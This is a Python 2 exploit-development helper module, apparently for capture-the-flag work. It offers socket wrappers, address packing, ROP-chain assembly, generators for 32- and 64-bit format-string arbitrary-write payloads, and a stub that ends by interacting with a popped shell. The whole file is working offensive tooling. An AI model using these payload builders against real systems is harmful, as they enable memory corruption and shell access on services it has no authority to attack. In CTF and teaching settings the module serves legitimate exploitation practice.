#!/usr/bin/python

# - This is Pwning module that helps you to build faster and easier payloads.
# - Pwning module works like a Interface (Abstract Class) that create a templet
# that you can base on it and create your payload.
# - Pwning module also support you create format string exploit easily, support x86 and x86-64
# - This module includes collection of shellcode, you can easily use it for your
# payload, supports Linux x86 and x86-64, arm will support later.
# - To install this module, you just copy this module to /usr/lib/python2.7 or python 3.1

# Author : Peternguyen
# Version : 0.2

import telnetlib
import socket
from ctypes import *
from struct import *

class Telnet(telnetlib.Telnet):
	# inherit from Telnetlib and add new method
	def __init__(self,host,port):
		telnetlib.Telnet.__init__(self,host,port)
	# make easier when you want to send raw data to server
	def send(self,data):
		return self.get_socket().send(data)

	def recv(self,size):
		return self.get_socket().recv(size)

	def writeRawData(self,data):
		return self.send(data)

	def recvRawData(self,size):
		return self.recv(size)


class Payload:
	# building my Payload here
	def __init__(self):
		# declare target here
		self.host = ['localhost','1.1.1.1']
		self.port = 1337
		self.mode = 0 # x86 , define target platform
		# self.conn = Telnet(self.host[0],self.port)

	# gethostbyname func
	def gethostbyname(self,hostname):
		return socket.gethostbyname(hostname)

	# utilities method that support your make your payload easier
	def p32(self,value):
		return pack('<I',value)

	def up32(self,value):
		return unpack('<I',value)[0]

	def p64(self,value):
		return pack('<Q',value)

	def up64(self,value):
		return unpack('<Q',value)[0]

	# using pack,unpack simplier by defining mode value
	def p(self,value):
		return self.p32(value) if self.mode == 0 else self.p64(value)

	def up(self,value):
		return self.up32(value) if self.mode == 0 else self.up64(value)

	# build your ropchain like this
	# ropchain = [
	#		your rop chain goes here
	#		0x41414141, # pop ebx; pop ecx; pop edx; ret
	#		0x43434343
	# ]
	def pRop(self,ropchain):
		return ''.join([self.p(rop) for rop in ropchain])

	# building format string payload support 32 and 64 bit :)
	# you can ovewrite this method and make it better
	def build32FormatStringBug(self,address,write_address,offset,pad = ''):
		fmt = pad
		for i in xrange(4):
			fmt += pack('<I',address + i)

		length_pad = len(fmt)
		start = 0
		if c_byte(write_address & 0xff).value < length_pad:
			start += 0x100

		# generate write string
		for i in xrange(0,4):
			byte = (write_address >> (8*i)) & 0xff
			byte += start
			fmt += '%{0}x'.format((byte - length_pad)) + '%{0}$n'.format(offset + i)
			length_pad = byte
			start += 0x100
		
		return fmt

	# this method require you must find a stable format string and offset that make stack offset doesn't change.
	def build64FormatStringBug(self,address,write_address,offset,pad = ''):
		fmt = ''
		next = 0
		last = len(fmt) # length pad
		for i in xrange(8):
			byte = (write_address >> (8*i)) & 0xff
			byte += next
			fmt+= '%{0}x%{1}$n'.format(byte - last,offset + i)
			last = byte
			next += 0x100
		# fmt+= 'A'*20 # you may custom here
		fmt+= pad # stable pad must be appended here
		for i in xrange(8):
			fmt+= self.p64(address + i)

		return fmt

	# dynamic buildFormatStringBug
	def buildFMT(self,address,write_address,offset,pad = ''):
		if self.mode: # for 64 bits mode
			return self.build64FormatStringBug(address,write_address,offset,pad)
		else: # for 32 bits mode
			return self.build32FormatStringBug(address,write_address,offset,pad)

	# ----------------------------
	# adding your new method here
	# ----------------------------

	# main method
	def pwnTarget(self):
		# ..... snip .....
		# when i exploit a bin with NX was enabled
		# print '[+] leak_func() :',hex(leak_func_addr)
		# print '[+] system() :',hex(system_addr)
		# print "[+] '/bin/sh' :",hex(bin_sh_addr)
		# ...... snip ......
		print '[+] Pwned Shell.'
		self.conn.interact() # pwn the shell